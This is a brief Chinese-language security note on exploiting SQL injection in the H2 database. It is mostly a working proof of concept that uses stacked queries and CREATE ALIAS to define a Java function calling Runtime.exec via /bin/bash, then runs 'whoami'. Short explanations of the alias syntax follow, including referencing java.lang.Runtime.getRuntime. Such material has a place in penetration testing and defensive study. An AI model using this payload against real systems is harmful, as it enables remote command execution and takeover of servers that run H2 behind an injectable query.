h2数据库支持多行查询，在有注入点的时候有如下poc
poc:

CREATE ALIAS EXEC AS 'void e(String cmd) throws java.io.IOException{String[] command = {"/bin/bash", "-c", cmd};java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(command);}';CALL EXEC("whoami")


CREATE ALIAS XXXXX AS是创建函数的语法，可以用$$your-code-here$$或者'xxxxx'来表示代码
CREATE ALIAS XXXXX FOR 'xxxx'是创建函数引用的语法,可以引用现有类的方法，比如java.lang.Runtime.getRuntime